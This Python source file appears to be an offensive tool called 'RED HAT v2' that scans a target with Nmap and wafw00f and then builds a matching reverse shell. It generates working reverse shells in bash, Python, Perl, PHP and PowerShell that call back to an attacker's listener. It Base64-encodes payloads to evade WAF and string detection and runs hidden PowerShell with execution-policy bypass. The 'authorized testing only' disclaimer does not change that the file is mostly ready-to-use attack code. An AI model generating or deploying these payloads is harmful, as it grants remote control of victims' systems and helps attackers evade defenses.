"""
RED HAT v2 — Precision Payload Generator
Profiles targets via Nmap + wafw00f, then crafts precision payloads.
For authorized penetration testing only.
"""

import os
import sys
import subprocess
import shutil
import base64
from datetime import datetime

try:
    import nmap
    from colorama import Fore, Style, init
    from dotenv import load_dotenv
except ImportError:
    print("[!] Dependencies missing. Run: python launcher.py")
    sys.exit(1)

init(autoreset=True)
load_dotenv()

LHOST_DEFAULT = os.getenv("LHOST", "")
OPERATOR      = os.getenv("OPERATOR", "Operator")
LAB_NAME      = os.getenv("LAB_NAME", "RED HAT Security Lab")


# ─────────────────────────────────────────────────────────────────────────────
# TARGET PROFILE
# ─────────────────────────────────────────────────────────────────────────────
class TargetProfile:
    def __init__(self, target: str):
        self.target           = target
        self.os_type          = "Unknown"    # Linux / Windows / Mac / Unknown
        self.os_detail        = "Unknown"    # e.g. "Ubuntu 20.04"
        self.open_ports       = []           # [22, 80, 443]
        self.services         = {}           # {80: "Apache httpd 2.4.51"}
        self.filtered_ports   = []           # ports nmap marked filtered
        self.waf_detected     = False
        self.waf_type         = "None"
        self.available_shells = []           # ["bash", "python3", "perl", "php"]
        self.web_service      = None         # Apache / Nginx / IIS / None
        self.nmap_scanned     = False
        self.waf_checked      = False
        self.notes            = ""

    def is_ready(self):
        return self.nmap_scanned or self.os_type != "Unknown"

    def summary_lines(self):
        lines = []
        lines.append(("TARGET",          self.target))
        lines.append(("OS",              f"{self.os_type} — {self.os_detail}"))
        lines.append(("OPEN PORTS",      ", ".join(str(p) for p in self.open_ports) or "None found"))
        lines.append(("FILTERED PORTS",  ", ".join(str(p) for p in self.filtered_ports) or "None"))
        lines.append(("SERVICES",        _fmt_services(self.services)))
        lines.append(("WAF",             f"{self.waf_type}" if self.waf_detected else "Not detected"))
        lines.append(("SHELLS",          ", ".join(self.available_shells) or "Unknown"))
        lines.append(("WEB SERVICE",     self.web_service or "None detected"))
        lines.append(("NMAP SCANNED",    "Yes" if self.nmap_scanned else "No"))
        lines.append(("WAF CHECKED",     "Yes" if self.waf_checked  else "No"))
        if self.notes:
            lines.append(("NOTES", self.notes))
        return lines


def _fmt_services(services: dict) -> str:
    if not services:
        return "None"
    parts = [f"{port}/{svc}" for port, svc in list(services.items())[:4]]
    return "  |  ".join(parts)


# ─────────────────────────────────────────────────────────────────────────────
# NMAP SCANNER
# ─────────────────────────────────────────────────────────────────────────────
def run_nmap_scan(profile: TargetProfile):
    print(f"\n  {Fore.CYAN}[*] Starting Nmap scan on {profile.target}...{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[*] Running: service/version detection + OS fingerprint + fast scan{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[*] This may take a minute — stand by...{Style.RESET_ALL}\n")

    try:
        nm = nmap.PortScanner()
        nm.scan(profile.target, arguments="-sV -O --open -T4 -F")

        hosts = nm.all_hosts()
        if not hosts:
            print(f"  {Fore.RED}[!] No hosts found. Target may be down or blocking ICMP.{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}[*] Try Manual Input to enter known info.{Style.RESET_ALL}")
            return

        for host in hosts:
            # ── OS Detection ──────────────────────────────────────────────
            if "osmatch" in nm[host] and nm[host]["osmatch"]:
                best = nm[host]["osmatch"][0]
                profile.os_detail = best.get("name", "Unknown")
                name_lower = profile.os_detail.lower()
                if any(k in name_lower for k in ["linux", "ubuntu", "debian", "centos", "fedora", "kali", "arch", "unix"]):
                    profile.os_type = "Linux"
                elif any(k in name_lower for k in ["windows", "microsoft"]):
                    profile.os_type = "Windows"
                elif any(k in name_lower for k in ["mac", "darwin", "osx"]):
                    profile.os_type = "Mac"

            # ── Ports and Services ────────────────────────────────────────
            for proto in nm[host].all_protocols():
                for port in nm[host][proto].keys():
                    info  = nm[host][proto][port]
                    state = info.get("state", "")

                    if state == "open":
                        profile.open_ports.append(port)
                        product = info.get("product", "")
                        version = info.get("version", "")
                        svc_name = info.get("name", "")
                        svc_str  = f"{product} {version}".strip() or svc_name
                        profile.services[port] = svc_str

                        # Web service detection
                        svc_lower = svc_str.lower()
                        if svc_name in ("http", "https", "http-alt") or port in (80, 443, 8080, 8443):
                            if "apache" in svc_lower:
                                profile.web_service = "Apache"
                            elif "nginx" in svc_lower:
                                profile.web_service = "Nginx"
                            elif "iis" in svc_lower:
                                profile.web_service = "IIS"
                            elif not profile.web_service:
                                profile.web_service = "Unknown Web"

                        # Shell detection from banners
                        if "python3" in svc_lower or ("python" in svc_lower and "3" in svc_lower):
                            _add_shell(profile, "python3")
                        elif "python" in svc_lower:
                            _add_shell(profile, "python3")
                        if "perl" in svc_lower:
                            _add_shell(profile, "perl")

                    elif state == "filtered":
                        profile.filtered_ports.append(port)

        # ── Default shell assumptions ─────────────────────────────────────
        if profile.os_type == "Linux":
            _add_shell(profile, "bash", front=True)
            _add_shell(profile, "python3")
        elif profile.os_type == "Windows":
            _add_shell(profile, "powershell", front=True)
            _add_shell(profile, "cmd")
        elif profile.os_type == "Mac":
            _add_shell(profile, "bash", front=True)
            _add_shell(profile, "python3")

        # Web service → PHP possible
        if profile.web_service in ("Apache", "Nginx", "Unknown Web"):
            _add_shell(profile, "php")

        profile.nmap_scanned = True
        _print_scan_result(profile)

    except nmap.PortScannerError as e:
        print(f"\n  {Fore.RED}[!] Nmap error: {e}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}[*] Is nmap installed?{Style.RESET_ALL}")
        print(f"      Kali/Ubuntu : sudo apt install nmap")
        print(f"      Arch        : sudo pacman -S nmap")
    except PermissionError:
        print(f"\n  {Fore.RED}[!] Permission denied — OS detection requires root.{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}[*] Try: sudo python launcher.py{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n  {Fore.RED}[!] Scan error: {e}{Style.RESET_ALL}")

    input(f"\n  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")


def _add_shell(profile, shell, front=False):
    if shell not in profile.available_shells:
        if front:
            profile.available_shells.insert(0, shell)
        else:
            profile.available_shells.append(shell)


def _print_scan_result(profile: TargetProfile):
    W = 56
    print(f"\n  {Fore.GREEN}╔{'═'*W}╗")
    print(f"  ║{'  NMAP SCAN RESULTS':^{W}}║")
    print(f"  ╠{'═'*W}╣{Style.RESET_ALL}")

    def row(label, value, vc=Fore.WHITE):
        print(f"  {Fore.CYAN}{label:<16}{Style.RESET_ALL}{vc}{str(value)[:W-18]}{Style.RESET_ALL}")

    row("OS DETECTED:", f"{profile.os_type} — {profile.os_detail}")
    row("OPEN PORTS:", ", ".join(str(p) for p in profile.open_ports) or "None")
    row("FILTERED:", ", ".join(str(p) for p in profile.filtered_ports) or "None")
    row("WEB SERVICE:", profile.web_service or "None")
    row("SHELLS:", ", ".join(profile.available_shells) or "Unknown")

    if profile.services:
        print(f"  {Fore.GREEN}╠{'═'*W}╣{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}SERVICES:{Style.RESET_ALL}")
        for port, svc in list(profile.services.items())[:6]:
            print(f"    {Fore.WHITE}{port:<6}{Fore.YELLOW}{svc[:W-8]}{Style.RESET_ALL}")

    print(f"  {Fore.GREEN}╚{'═'*W}╝{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
# WAF CHECK
# ─────────────────────────────────────────────────────────────────────────────
def run_waf_check(profile: TargetProfile):
    target_url = profile.target
    if not target_url.startswith("http"):
        target_url = f"http://{profile.target}"

    print(f"\n  {Fore.CYAN}[*] Running WAF detection on {target_url}...{Style.RESET_ALL}")

    if not shutil.which("wafw00f"):
        print(f"  {Fore.YELLOW}[!] wafw00f not found in PATH.{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}[*] Install: pip install wafw00f{Style.RESET_ALL}")
        manual = input(f"\n  {Fore.WHITE}Manually set WAF status? (y/n): {Style.RESET_ALL}").strip().lower()
        if manual == "y":
            waf_yn = input(f"  WAF present? (y/n): ").strip().lower()
            if waf_yn == "y":
                profile.waf_detected = True
                profile.waf_type = input(f"  WAF type (Enter for 'Unknown'): ").strip() or "Unknown"
            else:
                profile.waf_detected = False
                profile.waf_type = "None"
        profile.waf_checked = True
        input(f"\n  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")
        return

    try:
        result = subprocess.run(
            ["wafw00f", target_url, "-a"],
            capture_output=True,
            text=True,
            timeout=45
        )
        output = (result.stdout + result.stderr).lower()

        if "is behind" in output:
            profile.waf_detected = True
            for line in (result.stdout + result.stderr).split("\n"):
                if "is behind" in line.lower():
                    profile.waf_type = line.strip()
                    break
            else:
                profile.waf_type = "Detected (type unknown)"
        elif "no waf" in output or "not behind" in output:
            profile.waf_detected = False
            profile.waf_type = "None"
        else:
            profile.waf_detected = False
            profile.waf_type = "Unknown"

        profile.waf_checked = True

        if profile.waf_detected:
            print(f"  {Fore.RED}[!] WAF DETECTED: {profile.waf_type}{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}[*] Generator will apply encoding automatically.{Style.RESET_ALL}")
        else:
            print(f"  {Fore.GREEN}[+] No WAF detected — raw payloads applicable.{Style.RESET_ALL}")

    except subprocess.TimeoutExpired:
        print(f"  {Fore.YELLOW}[!] WAF check timed out.{Style.RESET_ALL}")
        profile.waf_checked = True
    except Exception as e:
        print(f"  {Fore.RED}[!] WAF check error: {e}{Style.RESET_ALL}")

    input(f"\n  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
# MANUAL INPUT
# ─────────────────────────────────────────────────────────────────────────────
def manual_input(profile: TargetProfile):
    while True:
        os.system("clear")
        _section_header("MANUAL INPUT — Override / Fill Profile Gaps")

        print(f"""
  {Fore.CYAN}[1]{Style.RESET_ALL}  Set OS type           (current: {Fore.YELLOW}{profile.os_type}{Style.RESET_ALL})
  {Fore.CYAN}[2]{Style.RESET_ALL}  Set OS detail          (current: {Fore.YELLOW}{profile.os_detail}{Style.RESET_ALL})
  {Fore.CYAN}[3]{Style.RESET_ALL}  Add open port
  {Fore.CYAN}[4]{Style.RESET_ALL}  Set WAF status         (current: {Fore.YELLOW}{"Detected — " + profile.waf_type if profile.waf_detected else "None"}{Style.RESET_ALL})
  {Fore.CYAN}[5]{Style.RESET_ALL}  Set available shells   (current: {Fore.YELLOW}{", ".join(profile.available_shells) or "None"}{Style.RESET_ALL})
  {Fore.CYAN}[6]{Style.RESET_ALL}  Set web service        (current: {Fore.YELLOW}{profile.web_service or "None"}{Style.RESET_ALL})
  {Fore.CYAN}[7]{Style.RESET_ALL}  Add notes
  {Fore.CYAN}[0]{Style.RESET_ALL}  Back
""")
        choice = input(f"  {Fore.WHITE}Select: {Style.RESET_ALL}").strip()

        if choice == "0":
            break

        elif choice == "1":
            print(f"\n  Options: Linux / Windows / Mac / Unknown")
            val = input(f"  OS type: ").strip()
            if val:
                profile.os_type = val.capitalize()

        elif choice == "2":
            val = input(f"  OS detail (e.g. Ubuntu 22.04): ").strip()
            if val:
                profile.os_detail = val

        elif choice == "3":
            val = input(f"  Port number: ").strip()
            svc = input(f"  Service name (optional): ").strip()
            if val.isdigit():
                port = int(val)
                if port not in profile.open_ports:
                    profile.open_ports.append(port)
                if svc:
                    profile.services[port] = svc
                print(f"  {Fore.GREEN}[+] Port {port} added.{Style.RESET_ALL}")
            else:
                print(f"  {Fore.RED}[!] Invalid port.{Style.RESET_ALL}")

        elif choice == "4":
            val = input(f"  WAF present? (y/n): ").strip().lower()
            if val == "y":
                profile.waf_detected = True
                profile.waf_type = input(f"  WAF type (Enter for 'Unknown'): ").strip() or "Unknown"
            else:
                profile.waf_detected = False
                profile.waf_type = "None"
            profile.waf_checked = True

        elif choice == "5":
            print(f"\n  Available options: bash, python3, perl, php, powershell, cmd")
            print(f"  Enter shells separated by commas:")
            val = input(f"  Shells: ").strip()
            if val:
                shells = [s.strip().lower() for s in val.split(",") if s.strip()]
                profile.available_shells = shells
                print(f"  {Fore.GREEN}[+] Shells set: {', '.join(shells)}{Style.RESET_ALL}")

        elif choice == "6":
            print(f"\n  Options: Apache / Nginx / IIS / None")
            val = input(f"  Web service: ").strip()
            profile.web_service = val if val.lower() != "none" else None

        elif choice == "7":
            val = input(f"  Notes: ").strip()
            if val:
                profile.notes = val

        else:
            print(f"  {Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")

        input(f"\n  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
# PROFILE REVIEW
# ─────────────────────────────────────────────────────────────────────────────
def review_profile(profile: TargetProfile):
    os.system("clear")
    W = 60
    print(f"\n  {Fore.RED}╔{'═'*W}╗")
    print(f"  ║{'  TARGET PROFILE':^{W}}║")
    print(f"  ╠{'═'*W}╣{Style.RESET_ALL}")

    for label, value in profile.summary_lines():
        _profile_row(label, value, W)

    print(f"  {Fore.RED}╚{'═'*W}╝{Style.RESET_ALL}")

    if not profile.is_ready():
        print(f"\n  {Fore.YELLOW}[!] Profile incomplete — run Nmap scan or use Manual Input.{Style.RESET_ALL}")
    else:
        print(f"\n  {Fore.GREEN}[+] Profile looks ready — proceed to Build Payload.{Style.RESET_ALL}")

    input(f"\n  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")


def _profile_row(label, value, W):
    waf_c = Fore.RED if "Detected" in str(value) or "WAF" in str(label) and "Not" not in str(value) else Fore.WHITE
    print(f"  {Fore.CYAN}{label:<18}{Style.RESET_ALL}{Fore.WHITE}{str(value)[:W-20]}{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
# DECISION ENGINE
# ─────────────────────────────────────────────────────────────────────────────
PREFERRED_OUTBOUND = [443, 80, 8080, 8443, 4444, 9001, 1234]


def decide_payload(profile: TargetProfile, lhost: str, lport: int) -> dict:
    result = {
        "type":      "",
        "payload":   "",
        "port":      lport,
        "encoding":  "none",
        "stabilize": "",
        "notes":     [],
    }

    # Best outbound port
    for p in PREFERRED_OUTBOUND:
        if p in profile.open_ports:
            result["port"] = p
            result["notes"].append(f"Port {p} selected — found open on target")
            break

    # Encoding
    if profile.waf_detected:
        result["encoding"] = "base64"
        result["notes"].append(f"WAF detected ({profile.waf_type}) — Base64 encoding applied")

    if profile.os_type == "Windows":
        _build_windows_payload(profile, result, lhost)
    else:
        _build_linux_payload(profile, result, lhost)

    return result


def _build_linux_payload(profile, result, lhost):
    port   = result["port"]
    shells = profile.available_shells
    encode = result["encoding"] == "base64"

    if not shells or "bash" in shells:
        result["type"] = "Bash Reverse Shell"
        raw = f"bash -i >& /dev/tcp/{lhost}/{port} 0>&1"
        if encode:
            enc = base64.b64encode(raw.encode()).decode()
            result["payload"] = f"echo {enc} | base64 -d | bash"
            result["notes"].append("Bash command Base64 encoded to bypass WAF")
        else:
            result["payload"] = raw
        result["stabilize"] = (
            f"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
            f"  export TERM=xterm\n"
            f"  # Then: Ctrl+Z  →  stty raw -echo  →  fg"
        )

    elif "python3" in shells:
        result["type"] = "Python3 Reverse Shell"
        inner = (
            f"import socket,subprocess,os;"
            f"s=socket.socket();"
            f"s.connect(('{lhost}',{port}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call(['/bin/bash','-i'])"
        )
        if encode:
            enc = base64.b64encode(inner.encode()).decode()
            result["payload"] = (
                f"python3 -c \"exec(__import__('base64').b64decode('{enc}').decode())\""
            )
            result["notes"].append("Python3 payload Base64 encoded")
        else:
            result["payload"] = f"python3 -c '{inner}'"
        result["stabilize"] = (
            f"import pty; pty.spawn('/bin/bash')\n"
            f"  # Already in Python — run this inside the shell"
        )

    elif "perl" in shells:
        result["type"] = "Perl Reverse Shell"
        result["payload"] = (
            f"perl -e 'use Socket;"
            f"$i=\"{lhost}\";$p={port};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");'"
        )
        result["stabilize"] = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"

    elif "php" in shells:
        result["type"] = "PHP Reverse Shell"
        result["payload"] = (
            f"<?php\n"
            f"$sock = fsockopen('{lhost}', {port});\n"
            f"$proc = proc_open('/bin/bash -i',\n"
            f"    array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);\n"
            f"proc_close($proc);\n"
            f"?>"
        )
        result["stabilize"] = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"

    else:
        result["type"] = "Bash Reverse Shell (fallback)"
        result["payload"] = f"bash -i >& /dev/tcp/{lhost}/{port} 0>&1"
        result["stabilize"] = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"


def _build_windows_payload(profile, result, lhost):
    port   = result["port"]
    encode = result["encoding"] == "base64"
    shells = profile.available_shells

    ps_core = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{port});"
        f"$stream = $client.GetStream();"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
        f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        f"$sendback=(iex $data 2>&1|Out-String);"
        f"$sb2=$sendback+'PS '+(pwd).Path+'> ';"
        f"$sb=([text.encoding]::ASCII).GetBytes($sb2);"
        f"$stream.Write($sb,0,$sb.Length);$stream.Flush()}};"
        f"$client.Close()"
    )

    if encode or "powershell" in shells:
        if encode:
            result["type"] = "PowerShell Reverse Shell (Base64 Encoded)"
            enc = base64.b64encode(ps_core.encode("utf-16-le")).decode()
            result["payload"] = f"powershell -EncodedCommand {enc}"
            result["notes"].append("UTF-16LE encoded for PowerShell -EncodedCommand — bypasses string detection")
        else:
            result["type"] = "PowerShell Reverse Shell"
            result["payload"] = (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"{ps_core}\""
            )
        result["stabilize"] = "# PowerShell shell is stable — no TTY upgrade needed"

    else:
        result["type"] = "cmd.exe Reverse Shell"
        result["payload"] = (
            f"cmd.exe /c \"powershell -NoP -NonI -W Hidden -Exec Bypass "
            f"-Command \\\"$client=New-Object Net.Sockets.TCPClient('{lhost}',{port});"
            f"...\\\"\""
        )
        result["notes"].append("cmd.exe wrapper — PowerShell not confirmed available")
        result["stabilize"] = "# cmd.exe — limited shell, escalate to PowerShell if possible"


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD BUILD + DISPLAY
# ─────────────────────────────────────────────────────────────────────────────
def build_payload_flow(profile: TargetProfile):
    os.system("clear")
    _section_header("BUILD PAYLOAD — Decision Engine")

    if not profile.is_ready():
        print(f"\n  {Fore.RED}[!] Profile not ready. Run Nmap scan or Manual Input first.{Style.RESET_ALL}")
        input(f"\n  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")
        return

    # LHOST
    lhost = LHOST_DEFAULT
    if not lhost:
        lhost = input(f"\n  {Fore.WHITE}Your listener IP (LHOST): {Style.RESET_ALL}").strip()
    else:
        print(f"\n  {Fore.CYAN}[*] Using LHOST from .env: {lhost}{Style.RESET_ALL}")
        override = input(f"  Override? (Enter to keep, or type new IP): ").strip()
        if override:
            lhost = override

    lport_raw = input(f"  Your listener port (LPORT) [default 4444]: ").strip()
    lport = int(lport_raw) if lport_raw.isdigit() else 4444

    print(f"\n  {Fore.CYAN}[*] Running decision engine...{Style.RESET_ALL}\n")

    result = decide_payload(profile, lhost, lport)
    _display_payload(profile, result, lhost)

    # Save option
    save = input(f"\n  {Fore.WHITE}Save this payload to reports/? (y/n): {Style.RESET_ALL}").strip().lower()
    if save == "y":
        _save_payload(profile, result, lhost)

    input(f"\n  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")


def _display_payload(profile, result, lhost):
    W = 64
    print(f"  {Fore.RED}╔{'═'*W}╗")
    print(f"  ║{'  GENERATED PAYLOAD':^{W}}║")
    print(f"  ╠{'═'*W}╣{Style.RESET_ALL}")

    def row(label, val, vc=Fore.WHITE):
        print(f"  {Fore.CYAN}{label:<18}{Style.RESET_ALL}{vc}{str(val)[:W-20]}{Style.RESET_ALL}")

    row("TARGET:",    profile.target)
    row("OS:",        f"{profile.os_type} — {profile.os_detail}")
    row("TYPE:",      result["type"],    Fore.GREEN)
    row("PORT:",      result["port"],    Fore.YELLOW)
    row("ENCODING:",  result["encoding"].upper())
    row("LHOST:",     lhost)

    print(f"  {Fore.RED}╠{'═'*W}╣{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}DECISION NOTES:{Style.RESET_ALL}")
    for note in result["notes"]:
        print(f"    {Fore.YELLOW}→ {note}{Style.RESET_ALL}")

    print(f"  {Fore.RED}╠{'═'*W}╣{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}PAYLOAD:{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}{result['payload']}{Style.RESET_ALL}\n")

    if result["stabilize"]:
        print(f"  {Fore.RED}╠{'═'*W}╣{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}STABILIZE SHELL AFTER CONNECT:{Style.RESET_ALL}")
        print(f"\n  {Fore.WHITE}{result['stabilize']}{Style.RESET_ALL}\n")

    print(f"  {Fore.RED}╚{'═'*W}╝{Style.RESET_ALL}")


def _save_payload(profile, result, lhost):
    os.makedirs("reports", exist_ok=True)
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    target_s = profile.target.replace(".", "_").replace("/", "_").replace(":", "_")
    filename = f"reports/payload_{target_s}_{ts}.txt"

    lines = [
        "RED HAT v2 — Generated Payload",
        f"Generated : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Operator  : {OPERATOR}",
        f"Lab       : {LAB_NAME}",
        "=" * 60,
        f"Target    : {profile.target}",
        f"OS        : {profile.os_type} — {profile.os_detail}",
        f"Type      : {result['type']}",
        f"Port      : {result['port']}",
        f"Encoding  : {result['encoding']}",
        f"LHOST     : {lhost}",
        "=" * 60,
        "DECISION NOTES:",
    ]
    for note in result["notes"]:
        lines.append(f"  → {note}")

    lines += [
        "=" * 60,
        "PAYLOAD:",
        result["payload"],
        "=" * 60,
        "STABILIZE SHELL AFTER CONNECT:",
        result["stabilize"],
    ]

    with open(filename, "w") as f:
        f.write("\n".join(lines))

    print(f"\n  {Fore.GREEN}[+] Payload saved: {filename}{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
# SESSION MANAGER — Multiple targets
# ─────────────────────────────────────────────────────────────────────────────
class SessionManager:
    def __init__(self):
        self.profiles: list[TargetProfile] = []
        self.active_index: int = -1

    @property
    def active(self) -> TargetProfile | None:
        if 0 <= self.active_index < len(self.profiles):
            return self.profiles[self.active_index]
        return None

    def new_target(self):
        target = input(f"\n  {Fore.WHITE}Enter target IP or URL: {Style.RESET_ALL}").strip()
        if not target:
            print(f"  {Fore.RED}[!] No target entered.{Style.RESET_ALL}")
            return
        profile = TargetProfile(target)
        self.profiles.append(profile)
        self.active_index = len(self.profiles) - 1
        print(f"\n  {Fore.GREEN}[+] Target set: {target}{Style.RESET_ALL}")
        input(f"  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")

    def switch_target(self):
        if not self.profiles:
            print(f"\n  {Fore.YELLOW}[!] No targets profiled yet.{Style.RESET_ALL}")
            input(f"  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")
            return

        print(f"\n  {Fore.CYAN}Profiled targets:{Style.RESET_ALL}")
        for i, p in enumerate(self.profiles):
            marker = f"{Fore.GREEN}[ACTIVE]{Style.RESET_ALL}" if i == self.active_index else "       "
            ready  = f"{Fore.GREEN}Ready{Style.RESET_ALL}" if p.is_ready() else f"{Fore.YELLOW}Incomplete{Style.RESET_ALL}"
            print(f"  [{i+1}] {marker} {p.target:<30} {ready}")

        choice = input(f"\n  {Fore.WHITE}Select target number (or Enter to add new): {Style.RESET_ALL}").strip()
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(self.profiles):
                self.active_index = idx
                print(f"  {Fore.GREEN}[+] Switched to: {self.profiles[idx].target}{Style.RESET_ALL}")
            else:
                print(f"  {Fore.RED}[!] Invalid selection.{Style.RESET_ALL}")
        elif choice == "":
            self.new_target()

        input(f"  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")

    def view_all(self):
        os.system("clear")
        _section_header("ALL TARGET PROFILES")
        if not self.profiles:
            print(f"\n  {Fore.YELLOW}No targets profiled this session.{Style.RESET_ALL}")
        else:
            for i, p in enumerate(self.profiles):
                marker = " [ACTIVE]" if i == self.active_index else ""
                print(f"\n  {Fore.RED}── Target {i+1}{marker}: {p.target} {'─'*30}{Style.RESET_ALL}")
                for label, value in p.summary_lines():
                    print(f"  {Fore.CYAN}{label:<18}{Style.RESET_ALL}{Fore.WHITE}{str(value)[:50]}{Style.RESET_ALL}")
        input(f"\n  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def _section_header(title: str):
    W = 60
    print(f"\n  {Fore.RED}╔{'═'*W}╗")
    print(f"  ║  {title:<{W-2}}║")
    print(f"  ╚{'═'*W}╝{Style.RESET_ALL}\n")


def _main_menu_banner(session: SessionManager):
    os.system("clear")
    W = 60
    active = session.active

    print(f"\n  {Fore.RED}╔{'═'*W}╗")
    print(f"  ║{'  RED HAT v2 — PRECISION PAYLOAD GENERATOR':^{W}}║")
    print(f"  ╠{'═'*W}╣{Style.RESET_ALL}")

    if active:
        status_c = Fore.GREEN if active.is_ready() else Fore.YELLOW
        print(f"  {Fore.CYAN}ACTIVE TARGET :{Style.RESET_ALL} {status_c}{active.target}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}OS            :{Style.RESET_ALL} {Fore.WHITE}{active.os_type}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}WAF           :{Style.RESET_ALL} {Fore.RED if active.waf_detected else Fore.WHITE}{'Detected — ' + active.waf_type if active.waf_detected else 'Not detected'}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}SHELLS        :{Style.RESET_ALL} {Fore.WHITE}{', '.join(active.available_shells) or 'Unknown'}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}PROFILES      :{Style.RESET_ALL} {Fore.WHITE}{len(session.profiles)} target(s) in session{Style.RESET_ALL}")
    else:
        print(f"  {Fore.YELLOW}No active target — select [1] to begin.{Style.RESET_ALL}")

    print(f"  {Fore.RED}╠{'═'*W}╣{Style.RESET_ALL}")
    print(f"""
  {Fore.CYAN}[1]{Style.RESET_ALL}  New Target
  {Fore.CYAN}[2]{Style.RESET_ALL}  Run Nmap Scan          {Fore.YELLOW}← auto-fills OS, ports, services{Style.RESET_ALL}
  {Fore.CYAN}[3]{Style.RESET_ALL}  Run WAF Check          {Fore.YELLOW}← wafw00f detection{Style.RESET_ALL}
  {Fore.CYAN}[4]{Style.RESET_ALL}  Manual Input           {Fore.YELLOW}← fill / override profile gaps{Style.RESET_ALL}
  {Fore.CYAN}[5]{Style.RESET_ALL}  Review Profile         {Fore.YELLOW}← full intelligence summary{Style.RESET_ALL}
  {Fore.CYAN}[6]{Style.RESET_ALL}  Build Payload          {Fore.GREEN}← decision engine → precision payload{Style.RESET_ALL}
  {Fore.CYAN}[7]{Style.RESET_ALL}  Switch / Add Target    {Fore.YELLOW}← manage multiple targets{Style.RESET_ALL}
  {Fore.CYAN}[8]{Style.RESET_ALL}  View All Profiles
  {Fore.CYAN}[0]{Style.RESET_ALL}  Exit
""")
    print(f"  {Fore.RED}╚{'═'*W}╝{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN ENTRY
# ─────────────────────────────────────────────────────────────────────────────
def run():
    session = SessionManager()

    while True:
        _main_menu_banner(session)
        choice = input(f"  {Fore.WHITE}Select: {Style.RESET_ALL}").strip()

        if choice == "0":
            print(f"\n  {Fore.YELLOW}[*] Exiting RED HAT v2. Stay authorized.{Style.RESET_ALL}\n")
            break

        elif choice == "1":
            session.new_target()

        elif choice in ("2", "3", "4", "5", "6"):
            if not session.active:
                print(f"\n  {Fore.RED}[!] No active target. Select [1] first.{Style.RESET_ALL}")
                input(f"  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")
                continue

            if choice == "2":
                run_nmap_scan(session.active)
            elif choice == "3":
                run_waf_check(session.active)
            elif choice == "4":
                manual_input(session.active)
            elif choice == "5":
                review_profile(session.active)
            elif choice == "6":
                build_payload_flow(session.active)

        elif choice == "7":
            session.switch_target()

        elif choice == "8":
            session.view_all()

        else:
            print(f"  {Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
